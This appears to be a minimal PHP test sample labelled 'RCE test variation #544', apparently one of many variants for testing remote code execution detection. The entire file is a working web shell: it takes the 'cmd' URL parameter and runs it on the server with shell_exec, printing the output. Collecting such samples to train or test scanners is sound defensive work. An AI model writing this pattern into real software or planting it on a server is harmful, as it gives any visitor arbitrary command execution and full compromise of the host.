<?php
// RCE test variation #544
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>